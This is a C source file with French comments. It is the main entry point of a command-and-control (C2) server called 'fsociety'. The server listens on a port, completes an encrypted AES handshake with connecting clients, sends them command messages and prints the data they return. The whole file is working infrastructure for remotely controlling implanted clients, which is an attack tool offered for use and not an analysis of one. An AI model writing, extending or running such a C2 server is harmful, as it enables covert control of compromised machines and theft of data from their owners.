#include "server.h"
#include "handshake.h"
#include "protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <sys/select.h>

/* ============================================================
 * fsociety — Point d'entrée du C2
 * ============================================================ */

static volatile sig_atomic_t g_running = 1;

static void handle_sigint(int sig)
{
    (void)sig;
    g_running = 0;
}

static void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("\n");
    printf("Options:\n");
    printf("  --port <num>    Port d'écoute (défaut: %u)\n",
           FSO_DEFAULT_PORT);
    printf("  --help          Affiche cette aide\n");
}

/* Boucle principale : accept + select sur les clients. */
static int run_server(fso_server_t *srv)
{
    printf("[+] C2 démarré. Ctrl+C pour quitter.\n\n");

    while (g_running) {
        fd_set readfds;
        FD_ZERO(&readfds);

        /* Socket d'écoute. */
        FD_SET(srv->listen_fd, &readfds);
        int maxfd = srv->listen_fd;

        /* Clients actifs. */
        for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
            if (srv->clients[i].active) {
                FD_SET(srv->clients[i].fd, &readfds);
                if (srv->clients[i].fd > maxfd) {
                    maxfd = srv->clients[i].fd;
                }
            }
        }

        /* Timeout de 1 s pour vérifier g_running. */
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            perror("[server] select");
            return -1;
        }
        if (ret == 0) continue; /* timeout */

        /* Nouvelle connexion ? */
        if (FD_ISSET(srv->listen_fd, &readfds)) {
            int idx = fso_server_accept(srv);
            if (idx >= 0) {
                uint8_t aes_key[FSO_KEY_SIZE];
                if (fso_handshake(srv, idx, aes_key) != 0) {
                    fprintf(stderr, "[-] Handshake échoué pour client #%d\n", idx);
                    fso_server_disconnect(srv, idx);
                } else {
                    printf("[+] Client #%d : session chiffrée établie\n", idx);

                    /* Stockage de la clé AES. */
                    memcpy(srv->clients[idx].aes_key, aes_key, FSO_KEY_SIZE);
                    srv->clients[idx].has_key = 1;

                    /* Test : envoyer un message chiffré. */
                    const char *msg = "hello from C2 (chiffré)";
                    if (fso_server_send_secure(srv, idx, MSG_CMD, 0,
                                                (const uint8_t *)msg,
                                                (uint32_t)strlen(msg)) == 0) {
                        printf("[+] Message chiffré envoyé au client #%d\n", idx);
                                                } else {
                                                    fprintf(stderr, "[-] Envoi chiffré échoué\n");
                                                }
                }
            }
        }

        /* Données entrantes sur un client ? */
        for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
            if (!srv->clients[i].active) continue;
            if (!srv->clients[i].has_key) continue;
            if (!FD_ISSET(srv->clients[i].fd, &readfds)) continue;

            fso_header_t header;
            uint8_t payload[FSO_MAX_PAYLOAD];

            int n = fso_server_recv_secure(srv, i, &header, payload, sizeof(payload));
            if (n < 0) {
                fso_server_disconnect(srv, i);
                continue;
            }

            printf("[client #%d] type=0x%02X seq=%u, %d octets\n",
                   i, header.type, header.seq_id, n);

            /* Affichage brut (pour debug). */
            if (n > 0) {
                fwrite(payload, 1, (size_t)n, stdout);
                printf("\n");
            }
        }
    }

    return 0;
}

int main(int argc, char **argv)
{
    uint16_t port = FSO_DEFAULT_PORT;

    /* Parsing des arguments. */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        }
        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            long p = strtol(argv[i + 1], NULL, 10);
            if (p <= 0 || p > 65535) {
                fprintf(stderr, "[-] Port invalide : %s\n", argv[i + 1]);
                return 1;
            }
            port = (uint16_t)p;
            i++;
        } else {
            fprintf(stderr, "[-] Option inconnue : %s\n", argv[i]);
            print_usage(argv[0]);
            return 1;
        }
    }

    /* Signal handler pour Ctrl+C. */
    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);

    /* Init du serveur. */
    fso_server_t srv;
    if (fso_server_init(&srv, port) != 0) {
        fprintf(stderr, "[-] Échec init serveur\n");
        return 1;
    }

    /* Boucle. */
    int ret = run_server(&srv);

    /* Nettoyage. */
    fso_server_close(&srv);

    return ret == 0 ? 0 : 1;
}